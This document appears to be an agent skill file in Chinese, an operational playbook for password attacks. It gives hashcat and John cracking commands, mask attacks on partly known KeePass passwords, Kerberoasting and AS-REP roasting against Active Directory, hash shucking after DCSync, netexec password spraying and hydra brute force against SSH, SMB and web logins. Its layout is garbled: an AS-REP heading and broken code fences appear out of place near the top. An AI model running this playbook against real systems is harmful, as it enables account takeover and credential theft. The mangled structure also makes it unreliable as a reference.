---
name: 'password-attacks'
description: '密码攻击 & Hash 破解：hash识别→hashcat规则/掩码(含"已知部分口令"掩码爆破)→John→Kerberoast/ASREP→密码喷洒→在线爆破。含开跑前的算力×密钥空间成本模型（hashcat -I / -b / ETA>15min 不开 / 慢哈希降级）、决策树与🆕口令形态优先清单（键盘走位）。（检索词：impacket/Rubeus/hashcat/john/kerberoast/keepass/mask/kdbx/cracking/rule/mask/spray/online/offline/password attacks/keyboard walk/键盘走位/Keyboard-Combinations/口令形态/wordlist/成本模型/cost model/算力/ETA/keyspace/hashcat -I/backend/后端/GPU/CPU/pocl/慢哈希/slow hash/DCC2/mscash2/PBKDF2/降级）'
whenToUse: '拿到 hash 或需要爆破时：hash 识别→hashcat 规则/掩码→john→Kerberoast/ASREP→密码喷洒。'
metadata: { domain: creds, tier: T1 }
---

# 密码攻击 & Hash 破解

> 🔴 **拿到 hash 第一步：识别类型 → 搜 knowndbs → 查询是否已破解。不要直接跑 hashcat。**

# 🔴 判据纠偏：rockyou 跑完 10 分钟不中 ≠ 口令强，只说明"形态不在这个字典里"，别急着放弃 Kerberoast
```

---

## 4. AS-REP Roasting

```

## 0. Hash 识别

```
hashid <hash>                    # 首选
hash-identifier <hash>          # 备选
hashcat --example-hashes | grep -i <prefix>

# 常见格式速查:
$1$        → MD5 crypt (Linux)
$2a$/2y$   → bcrypt
$5$        → SHA256 crypt
$6$        → SHA512 crypt
$P$        → phpBB/WordPress MD5
$y$        → yescrypt
:1000:     → NTLM (LM:NT 格式)
$krb5tgs$  → Kerberos TGS
$krb5asrep$→ AS-REP hash
$pkinit$   → PKINIT (certipy)
$racf$     → RACF
$ethereum$ → Ethereum
```

---

## 1. hashcat 核心命令

```
🔴 分级（Browsed 教训）:
   <1K 候选 → Kali CPU 直接跑（传输+配置 GPU 的成本 > 破解时间）
   1K-1M 候选 → GPU 物理机（RTX 5070 Ti ≈ 1000x Kali CPU）
   >1M 候选 / 掩码 → GPU + 规则，物理机后台跑

🔴 **本机 GPU 实测基线（2026-09-30 JobTwo 实测，务必背下来，下面 §1.1 全靠它估时）**
```
RTX 5070 Ti，hashcat v7.0.0:  -m 0 (MD5)    = 67,743 MH/s   ← 6.8e10/s
                             -m 5600(NetNTLMv2)=  4,447 MH/s  ← 4.4e9/s，比 MD5 慢 ~15x
Kali CPU 对照:                -m 5600       =      4.6 MH/s  ← GPU 快 ~965x
```
# 基础
hashcat -m <mode> <hashfile> <wordlist>
hashcat -m <mode> <hashfile> <wordlist> -r <rule>    # 规则
hashcat -m <mode> <hashfile> -a 3 ?l?l?l?l?d?d       # 掩码攻击
hashcat -m <mode> <hashfile> --show                   # 显示已破解
hashcat -m <mode> <hashfile> -r best64.rule --loopback # 组合迭代

# 常用模式
-m 0      MD5
-m 100    SHA1
-m 1000   NTLM
-m 1400   SHA256
-m 1700   SHA512
-m 1800   SHA512 crypt ($6$)
-m 3000   LM
-m 3200   bcrypt ($2a$)
-m 13100  Kerberos TGS (Kerberoast)
-m 18200  AS-REP Roast
-m 19600  Kerberos TGS (AES128)
-m 19700  Kerberos TGS (AES256)
-m 22000  WPA/WPA2
-m 13400  KeePass
-m 22100  BitLocker
# 🆕 Hash Shucking (NT-candidate)
-m 35300  Kerberos TGS + NT hash corpus (密码复用!)
-m 35400  AS-REP + NT hash corpus
-m 31600  DCC2 + NT hash corpus
```

### 常用规则

```
best64.rule          # 通用首选
d3ad0ne.rule         # 大型规则集
OneRuleToRuleThemAll # 社区最强
rockyou-30000.rule   # 生成式
T0XIC.rule           # 中等强度
```

### 掩码攻击模板

```
?a                    # 全部字符集 (小写+大写+数字+特殊)
?l?l?l?l?l?l?l?l     # 8位全小写
?u?l?l?l?l?l?d?d     # 1大写+5小写+2数字 (公司密码常见)
?d?d?d?d?d?d?d?d    # 8位全数字
```

---

### 🔴 已知部分口令 → 掩码爆破（KeePass / 加密容器最常见）

**场景**：从截图、便签、聊天记录里拿到**被遮挡/不完整**的口令（如 `UA7cpa[#1!_*ZX`），后面缺几位。
**不要猜** —— 把已知部分当**固定掩码前缀**，只爆未知位。

```bash
# KeePass 数据库 → 先抽 hash
keepass2john target.kdbx > target.hash        # 格式: 用户名:$keepass$*2*...
# 已知前 14 位，只爆最后 1 位
hashcat --user target.hash -m 13400 -a 3 'UA7cpa[#1!_*ZX?a'
#                                              ^^^^^^^^^^^^^^^ 已知   ^^^ 未知
```

**要点**：
- `-a 3`（掩码）比 `-a 0`（字典）快几个数量级 —— **已知部分越多越该用掩码**
- 未知位数不确定时**从 1 位开始递增**（`?a` → `?a?a` → `?a?a?a`），别一上来就开大
- 同手法适用于：KeePass(`-m 13400`)、7z/rar/zip 加密包、BitLocker、PDF
- 🔴 **口令线索常藏在图片里**（截图 / 便签 / 白板照）—— 拿到用户目录时**把图片也一起拖回来**

---

## 1.1 🔴 GPU 调用的四个坑 + 候选量算术（JobTwo 实测，每条都真实踩过）

### 1.1.0 🔴 开跑前的 30 秒闸：算力 × 密钥空间成本模型（Ifrit 实测）

**离线爆破的第一动作不是选字典，是问"这台机器每秒能做多少次"。** 顺序写死：

```
[ ] ① hashcat -I              # 先看**后端**:只有 pocl(CPU) 还是真有 GPU/CUDA/OpenCL
[ ] ② hashcat -b -m <mode>    # 拿该模式的**实测速率**(H/s)，不是理论值
[ ] ③ ETA = keyspace ÷ rate   # keyspace 见下方 ④ 的算法
[ ] ④ 🔴 ETA > 15 min ⇒ **不开**。改走"找明文"路线（凭据载体 / 复用 / shucking）
```

🔴 **慢哈希默认降级**：PBKDF2 系（**DCC2/mscash2 = 10240 轮**、KeePass、7z、BitLocker…）
在**纯 CPU** 上是设计上就难破的目标 —— 有 GPU 或**强线索**（已知口令形态/部分明文）才碰。
判据（实测）：`hashcat -I` 只有 pocl 后端 ⇒ DCC2 ≈ **10k H/s**，rockyou 单趟 20+ 分钟、加规则是小时级。
Ifrit 实测代价：**~30 分钟 × 9–12 核**白烧在 DCC2 上，而 `hashcat -I` 到 04:37 才查（本该在 04:04 开跑前 30 秒做）。
⇒ 一句话：**"破不出来"是结论，但"根本没算过 ETA 就开跑"不是探索，是浪费算力**。

**① 必须在 hashcat 自己的目录里跑** —— 它要相对路径 `./OpenCL/`：
```powershell
cd "C:\Python313\Lib\site-packages\hashcat\hashcat"      # 换工作目录，不是只写全路径
.\hashcat.exe -m 5600 julian.hash .\rockyou.txt -r .\rules\best64.rule
# 报 "No OpenCL platforms found" 就是这个原因，不是驱动没装
```

**② 必须 `--backend-ignore-cuda`** —— 否则 NVIDIA 后端初始化失败后直接退出（本机 OpenCL 可用，CUDA 后端不可用）。

**③ `-O` 不总是更快** —— 实测 `-m 5600` 加 `-O` 只有 **328 MH/s**，去掉 `-O` 是 **4447 MH/s（快 13 倍）**。
⇒ **先跑 `hashcat -b -m <mode>` 拿真实速率，别照搬"优化参数"。**

**④ 🔴 候选量算术必须在开跑前算，别靠感觉（本次真错了一千倍）**
```
候选数 = 字符集大小 ^ 长度 × 规则数 × 词表行数
?l=26  ?u=26  ?d=10  ?a=95  ?s=33
时间 = 候选数 / 实测速率
```
| 目标 | 候选量 | GPU 实测 ETA |
|---|---|---|
| rockyou(14M) × best64 | ~9e8 | **< 1 s** |
| rockyou × 5 个规则集 | ~2e12（`-m 5600`） | ~7.5 min/轮 |
| `?l?l?l?l?l?l?l?l`（8 位小写） | 2.1e11 | 47 s |
| **`?a` × 7** | **7.0e13** | **4.4 h**（我一开始口算成"25 秒" —— 错了 1000 倍，白等） |
| **`?a` × 8** | 6.6e15 | **~17 天** ⇒ 不可能 |

🔴 **结论：8 位以上全字符集掩码在单卡上不可行**；要么有掩码/口令结构的先验（见 §"已知部分口令"），
要么换字典+规则组合。**先算 ETA 再决定跑不跑**，这一条比任何工具技巧都省时间。

**⑤ 「破不出来」也是结论** —— 跑完 rockyou + 主流规则集 + 合理掩码仍未命中，就应判定
**"口令不在常见空间"**并停止投入（JobTwo 的两个哈希都是这个结局），转去找别的凭据面，
而不是继续加规则集。**把这个判断写进台账**，否则下个会话会重跑一遍。

## 2. John the Ripper 核心命令

```
# 基础
john --wordlist=<wordlist> <hashfile>
john --show <hashfile>
john --format=<format> <hashfile>

# 常用格式
--format=NT                   # NTLM
--format=LM                   # LM
--format=Raw-SHA256
--format=crypt                # Linux /etc/shadow
--format=krb5tgs              # Kerberos TGS
--format=krb5asrep            # AS-REP

# SSH 私钥 → john
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt

# ZIP/RAR/PDF → john
zip2john file.zip > hash.txt
rar2john file.rar > hash.txt
pdf2john file.pdf > hash.txt
```

---

## 3. Kerberoasting 最佳实践

```
🔴 AES256 ($krb5tgs$18$*...) → 仅试 rockyou (~5kH/s)，用完即弃转委派
🔴 RC4 ($krb5tgs$23$...)    → 可爆破

# 请求 TGS (🔴 尽量请求 RC4 — AES256 速度极慢但弱密码仍可爆)
impacket-GetUserSPNs DOMAIN/user:pass -request -outputfile hashes.txt
Rubeus.exe kerberoast /outfile:hashes.txt

# 爆破
hashcat -m 13100 hashes.txt rockyou.txt                    # RC4 (快!)
hashcat -m 19700 hashes.txt rockyou.txt                    # AES256 (慢, 仅试 rockyou)
hashcat -m 19600 hashes.txt rockyou.txt                    # AES128 (慢)

# 🆕 Targeted Kerberoast (GenericWrite/GenericAll → 加 SPN → roast → 删 SPN)
# bloodyAD add servicePrincipalName <target_DN> -v 'fake/$(random)'  # 加 SPN
# impacket-GetUserSPNs → hashcat → 破解后 bloodyAD remove servicePrincipalName

# 🆕 先按"口令形态"选字典，再谈字典大小（同一个 hash 换字典比换显卡便宜）
# 「手指在键盘上滑过去」型：相邻键走位 + 年份/符号尾巴
hashcat -m 13100 hashes.txt /usr/share/seclists/Passwords/Keyboard-Combinations.txt
#   🔴 seclists 路径随版本变化，先 `locate -i keyboard` / find 确认再跑
# 同类"形态优先"清单（按命中率排）: 公司/站点名+年份季节 → 键盘走位+年份 → 季节+符号 → rockyou
# 无需凭据，用户设置了 DONT_REQ_PREAUTH
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -outputfile hashes.txt
impacket-GetNPUsers DOMAIN/user -no-pass  # 指定用户

# 爆破
hashcat -m 18200 hashes.txt rockyou.txt

# netexec
netexec ldap DC_IP -u users.txt -p '' --asreproast output.txt
```

---

## 5. 密码喷洒

```
# netexec 喷洒（安全优先：--no-bruteforce 避免锁账户）
netexec smb DC_IP -u users.txt -p 'Spring2025!' --no-bruteforce
netexec smb DC_IP -u users.txt -p passwords.txt --no-bruteforce

# LDAP 喷洒
netexec ldap DC_IP -u users.txt -p 'Password123' --no-bruteforce

# 🔴 先查密码策略！
netexec smb DC_IP -u guest -p '' --pass-pol
netexec ldap DC_IP -u '' -p '' --pass-pol

# 喷洒节奏: 1密码/小时 > 批量
```

---

## 6. Linux /etc/shadow 破解

```
# unshadow → 🔴 必须加 --username！否则格式匹配失败
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
hashcat -m 1800 combined.txt rockyou.txt --username    # $6$
hashcat -m 3200 combined.txt rockyou.txt --username    # $2a$ (bcrypt → 慢!)
```

---
## 6.5 🆕 Hash Shucking (NT-Candidate)

> 详见 hash-shucking

```
# 原理: DCSync → 大量 NT hash → 当 wordlist 喂给 Kerberoast/ASREP/DCC2
# 如果匹配 → 该用户跨域/跨服务密码复用！

hashcat -m 35300 kerberoast.txt nt_hashes.txt    # Kerberoast + NT corpus (M hash/s)
hashcat -m 35400 asrep.txt nt_hashes.txt          # AS-REP + NT corpus
hashcat -m 31600 dcc2.txt nt_hashes.txt           # DCC2 + NT corpus
# 🔴 NT-candidate 不爆破 — 直接配对！多域环境密码复用率 40-60%
```

---

## 7. 密码变异（已知公司策略时）

```
# 已知: 公司要求 1大写+1数字+1特殊 + 8字符
hashcat --stdout -a 3 "Company?d?d?s" > custom.txt

# 已知: 某用户的舊密码是 Spring2024! → 试 Spring2025!
echo 'Spring2024!' > /tmp/base.txt
hashcat -m 1000 hash.txt -a 6 /tmp/base.txt ?a?a?a?a       # 加后缀 (hybrid)
echo 'Spring2025!' | hashcat -m 1000 hash.txt -r best64.rule # pipe 输入

# 月份/季节替换
printf "Spring\nSummer\nFall\nWinter\nJanuary\nFebruary\n" | while read w; do
  echo "${w}2025!"; echo "${w}2025@"; echo "${w}2026!"
done

# 🆕 尾部数字轮换（在线喷洒用；见 credential-spraying-password-reuse 的"实例轮换"节）
#    形态实测：`<Word><Word><N>`，N 会变（5 → 17），且**可能撞回旧值**
printf 'WestminsterOrange%s\n' $(seq 0 99) > tailnum.txt
# 🆕 leet/谐音还原：F15H ↔ F1SH · 0↔O · 1↔I · 3↔E · 5↔S · 4↔A
#    拿到 `69F15HST1CX` 这类形态时同时试 `69F1SHST1CX`
```

---

## 8. 在线破解工具

```
# hydra
hydra -l user -P passwords.txt ssh://IP
hydra -L users.txt -p 'Password123' smb://IP
hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# medusa
medusa -h IP -u user -P passwords.txt -M ssh

# ncrack
ncrack -p 3389 --user user -P passwords.txt IP

🔴 在线爆破风险: 触发锁定 > 触发告警 > 浪费 VPN 带宽。优先离线爆破！
```

---

## 快速决策树

```
拿到 hash → hashid 识别
  ├─ NTLM    → hashcat -m 1000 → 不行 → PtH (不必破解)
  ├─ Kerberos AES → -m 19700 仅试 rockyou (5kH/s) → 不中 → 委派
  ├─ Kerberos RC4 → hashcat -m 13100
  ├─ Linux $6$ → hashcat -m 1800
  ├─ bcrypt   → 浪费时间 (极慢) → 换攻击路径
  ├─ MD5/SHA1 → hashcat 秒破
  └─ 未知格式 → john 自动检测 → 不行 → Google 格式特征
  └─ 🆕 DCSync 后有大量 NT hash → hash-shucking NT-candidate 验证密码复用
```

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 不识别格式直接跑 hashcat | ✅ 先 hashid |
| ❌ AES256 Kerberoast 死磕一晚上 | ✅ 仅试 rockyou (10分钟) → 不中换委派 |
| ❌ 在线爆破生产环境 | ✅ 离线爆破 / PtH |
| ❌ bcrypt 跑一晚上没结果 | ✅ 换攻击路径 |
| ❌ 密码喷洒不先查锁定策略 | ✅ `--pass-pol` 先 |
